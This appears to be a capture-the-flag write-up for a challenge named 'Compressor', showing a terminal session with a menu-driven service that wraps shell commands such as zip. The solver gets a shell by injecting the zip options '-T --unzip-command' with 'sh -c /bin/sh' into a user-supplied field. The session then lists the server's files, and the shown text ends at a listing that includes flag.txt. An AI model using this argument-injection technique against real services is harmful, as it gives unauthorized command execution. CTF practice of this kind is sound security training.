# Compressor

##  CHALLENGE DESCRIPTION

Ramona's obsession with modifications and the addition of artifacts to her body has slowed her down and made her fail and almost get killed in many missions. For this reason, she decided to hack a tiny robot under Golden Fang's ownership called "Compressor", which can reduce and increase the volume of any object to minimize/maximize it according to the needs of the mission. With this item, she will be able to carry any spare part she needs without adding extra weight to her back, making her fast. Can you help her take it and hack it?

'''
nc 83.136.254.158 44462

[*] Directory to work in: r91Oj85oTvtDVGTTDLF5HXFrrBWy5uBn

Component List:

+===============+
|               |
|  1. Head  🤖  |
|  2. Torso 🦴   |
|  3. Hands 💪  |
|  4. Legs  🦵   |
|               |
+===============+
  
[*] Choose component: 1

[*] Sub-directory to work in: r91Oj85oTvtDVGTTDLF5HXFrrBWy5uBn/Head


Actions:

1. Create artifact
2. List directory    (pwd; ls -la)
3. Compress artifact (zip <name>.zip <name> <options>)
4. Change directory  (cd <dirname>)
5. Clean directory   (rm -rf ./*)
6. Exit
  
[*] Choose action: 1   


Insert name: hack

Insert content: hack


[+] Artifact [hack] was created successfuly!

Actions:                                                                                                                                                      
                                                                                                                                                              
1. Create artifact                                                                                                                                            
2. List directory    (pwd; ls -la)                                                                                                                            
3. Compress artifact (zip <name>.zip <name> <options>)                                                                                                        
4. Change directory  (cd <dirname>)                                                                                                                           
5. Clean directory   (rm -rf ./*)                                                                                                                             
6. Exit                                                                                                                                                       
                                                                                                                                                              
[*] Choose action: 3


Insert <name>.zip: hack
Insert <name>: hack
Insert <options>: -T --unzip-command 'sh -c /bin/sh'
  adding: hack (stored 0%)
id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
whoami
ctf
pwd
/home/ctf/r91Oj85oTvtDVGTTDLF5HXFrrBWy5uBn/Head
cd ..
cd ..
ls -la
total 40
drwxr-sr-x    1 ctf      ctf           4096 Nov  6 04:57 .
drwxr-xr-x    1 root     root          4096 Mar  3  2022 ..
drwxr-sr-x    6 ctf      ctf           4096 Nov  6 04:57 AK2XyC6xRqb0CRMAp5qwDGe56kkgrAoQ
drwxr-sr-x    6 ctf      ctf           4096 Nov  6 04:57 EGlPz7Fe6LK7gPBTvKNh5OmPFSBYMRlY
-rwxrwxr-x    1 root     root          3020 May 16  2022 artifacts.py
-rw-rw-r--    1 root     root           263 May 12  2022 clear.py
-rw-rw-r--    1 root     root            41 May 23  2022 flag.txt
drwxr-sr-x    6 ctf      ctf           4096 Nov  6 04:57 r91Oj85oTvtDVGTTDLF5HXFrrBWy5uBn
drwxr-sr-x    6 ctf      ctf           4096 Nov  6 04:57 sfOow1YsRyo7BGG2iDoFW7Z57RYSN7H7
'''
